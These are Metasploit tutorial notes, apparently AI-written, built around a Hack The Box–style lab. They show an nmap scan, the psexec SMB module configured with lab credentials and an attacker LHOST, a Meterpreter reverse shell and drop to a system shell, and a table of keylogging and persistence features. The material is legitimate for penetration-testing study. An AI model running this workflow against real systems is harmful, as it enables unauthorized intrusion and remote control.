# 1️⃣ What Is Metasploit?

Metasploit Framework is an **automated attack framework** developed by Rapid7 that streamlines the process of:

- Exploiting vulnerabilities
    
- Delivering payloads
    
- Gaining shell access
    
- Performing post-exploitation
    

It uses **pre-built modules** containing exploit code and payloads.

---

## 📊 Metasploit Exploitation Workflow

![Image](https://www.hackthebox.com/storage/blog/YnHEQmhMyFQOFq6EfH5B4xV1NO5d7YPL.jpg)

![Image](https://www.varonis.com/hubfs/Imported_Blog_Media/metasploit-guide-benefits.png?hsLang=en)

![Image](https://www.researchgate.net/publication/335456696/figure/fig1/AS%3A806675057504258%401569337729909/An-example-of-a-reverse-TCP-shell.jpg)

![Image](https://cdn.prod.website-files.com/681e366f54a6e3ce87159ca4/6877c6d94cd1d4bca7c48143_bind-shell-vs-reverse-shell-01.png)

---

# 2️⃣ Why Metasploit Is Important

|Feature|Explanation|
|---|---|
|Automation|Automates exploitation|
|Payload delivery|Automatically delivers payload|
|Built-in exploits|Thousands of exploits available|
|Built-in payloads|Hundreds of payloads available|
|Easy configuration|Simple commands|
|Post-exploitation tools|File access, keylogging, privilege escalation|

---

# 3️⃣ Metasploit Editions

|Edition|Description|
|---|---|
|Community Edition|Free version|
|Metasploit Pro|Paid version used by companies|

Metasploit Pro includes:

- Social engineering campaigns
    
- Web interface
    
- Automation
    
- Reporting features
    

---

# 4️⃣ Starting Metasploit

Start Metasploit console:

```bash
sudo msfconsole
```

Output example:

```bash
metasploit v6.0.44-dev
2131 exploits
592 payloads
```

---

## 📊 Metasploit Console Interface

![Image](https://www.offsec.com/_astro/msfconsolehelp-2_ZM0D9Q.webp)

![Image](https://www.offsec.com/_astro/msfconsolehelp-2_2mkfJx.webp)

![Image](https://docs.rapid7.com/images/metasploit/meterpreter_pro.png)

![Image](https://docs.rapid7.com/images/metasploit/m_shell_commands.png)

---

# 5️⃣ Metasploit Modules Overview

|Module Type|Purpose|
|---|---|
|exploit|Exploits vulnerability|
|payload|Code executed on target|
|auxiliary|Scanning and enumeration|
|post|Post exploitation|
|encoder|Encode payload|
|evasion|Avoid detection|

---

# 6️⃣ Enumeration with Nmap

Example scan:

```bash
nmap -sC -sV -Pn 10.129.164.25
```

Output:

|Port|Service|
|---|---|
|135|msrpc|
|139|netbios|
|445|SMB|

This indicates:

- Target OS: Windows
    
- Attack vector: SMB (port 445)
    

---

# 7️⃣ Searching for Exploit Modules

Inside Metasploit:

```bash
search smb
```

Example result:

```bash
exploit/windows/smb/psexec
```

---

# 8️⃣ Module Naming Structure Explained

Example module:

```bash
exploit/windows/smb/psexec
```

|Component|Meaning|
|---|---|
|exploit|Module type|
|windows|Target OS|
|smb|Target service|
|psexec|Exploit method|

---

# 9️⃣ Selecting Exploit Module

Use module:

```bash
use exploit/windows/smb/psexec
```

Output:

```bash
defaulting to windows/meterpreter/reverse_tcp
```

Default payload:

```bash
windows/meterpreter/reverse_tcp
```

---

# 🔟 Viewing Module Options

Command:

```bash
options
```

Example output:

|Option|Description|
|---|---|
|RHOSTS|Target IP|
|RPORT|Target port|
|SMBUser|Username|
|SMBPass|Password|
|LHOST|Attacker IP|
|LPORT|Listener port|

---

# 1️⃣1️⃣ Setting Required Options

Example configuration:

```bash
set RHOSTS 10.129.180.71
```

```bash
set SMBUser htb-student
```

```bash
set SMBPass HTB_@cademy_stdnt!
```

```bash
set LHOST 10.10.14.222
```

```bash
set SHARE ADMIN$
```

---

# 1️⃣2️⃣ Option Explanation Table

|Option|Meaning|
|---|---|
|RHOSTS|Target IP|
|SMBUser|Username|
|SMBPass|Password|
|SHARE|SMB share|
|LHOST|Attacker IP|
|LPORT|Listener port|

---

# 1️⃣3️⃣ Running the Exploit

Execute exploit:

```bash
exploit
```

Output:

```bash
Meterpreter session 1 opened
```

You now have shell access.

---

# 1️⃣4️⃣ What Is Meterpreter?

Meterpreter is an advanced payload that provides:

- Stealth access
    
- Memory-based execution
    
- Advanced post-exploitation features
    

---

## Meterpreter Architecture

![Image](https://www.offsec.com/_astro/msfarch2_2eCIOp.webp)

![Image](https://www.researchgate.net/publication/335456696/figure/fig1/AS%3A806675057504258%401569337729909/An-example-of-a-reverse-TCP-shell.jpg)

![Image](https://www.varonis.com/hubfs/Imported_Blog_Media/metasploit-guide-set-up.png?hsLang=en)

![Image](https://cdn.prod.website-files.com/5efc3ccdb72aaa7480ec8179/673c4139f7c9e8a1b4d9468a_61ede195222006f6c54b1f20_Metasploit%2520Framework%2520Architecture.png)

---

# 1️⃣5️⃣ Meterpreter Features

|Feature|Description|
|---|---|
|Command execution|Execute commands|
|File upload/download|Transfer files|
|Keylogging|Capture keystrokes|
|Process control|Manage processes|
|Privilege escalation|Gain admin access|
|Persistence|Maintain access|

---

# 1️⃣6️⃣ Meterpreter Commands

|Command|Purpose|
|---|---|
|help|Show commands|
|sysinfo|System info|
|getuid|Current user|
|shell|Get system shell|
|ls|List files|
|upload|Upload file|
|download|Download file|

Example:

```bash
sysinfo
```

---

# 1️⃣7️⃣ Switching to System Shell

Command:

```bash
shell
```

Output:

```bash
C:\WINDOWS\system32>
```

This gives full OS shell access.

---

# 1️⃣8️⃣ Exploit Execution Flow

```text
Scan → Find vulnerability → Select exploit → Set payload → Run exploit → Get Meterpreter shell
```

---

# 1️⃣9️⃣ What Happens Behind the Scenes

Metasploit:

1. Connects to target
    
2. Authenticates using credentials
    
3. Uploads payload
    
4. Executes payload
    
5. Creates reverse connection
    
6. Opens Meterpreter session
    

---

# 2️⃣0️⃣ Example Attack Flow Table

|Step|Action|
|---|---|
|1|Run nmap scan|
|2|Find SMB open|
|3|Search Metasploit module|
|4|Select exploit|
|5|Configure options|
|6|Run exploit|
|7|Gain shell|

---

# 2️⃣1️⃣ Important Concepts

|Concept|Explanation|
|---|---|
|Exploit|Uses vulnerability|
|Payload|Executes commands|
|Meterpreter|Advanced payload|
|Handler|Listener|
|Session|Active shell|

---

# 2️⃣2️⃣ Advantages of Metasploit

|Advantage|Explanation|
|---|---|
|Automation|Easy exploitation|
|Many payloads|Flexible|
|Reliable|Tested exploits|
|Post-exploitation tools|Advanced control|

---

# 2️⃣3️⃣ Key Takeaways

|Important Point|Explanation|
|---|---|
|Metasploit automates exploitation|Saves time|
|Uses exploit modules|Pre-built|
|Uses payloads|To gain shell|
|Meterpreter provides advanced control|Stealthy|
|Requires correct configuration|Critical|

---

# 2️⃣4️⃣ Quick Metasploit Cheat Sheet

|Task|Command|
|---|---|
|Start Metasploit|sudo msfconsole|
|Search module|search smb|
|Use module|use exploit/windows/smb/psexec|
|View options|options|
|Set target|set RHOSTS IP|
|Set attacker IP|set LHOST IP|
|Run exploit|exploit|
|Get shell|shell|

---

If you want, I can also create:

- Metasploit Complete Cheat Sheet
    
- Meterpreter Command Cheat Sheet
    
- msfvenom Payload Creation Cheat Sheet
    
- Real-world Metasploit attack workflow guide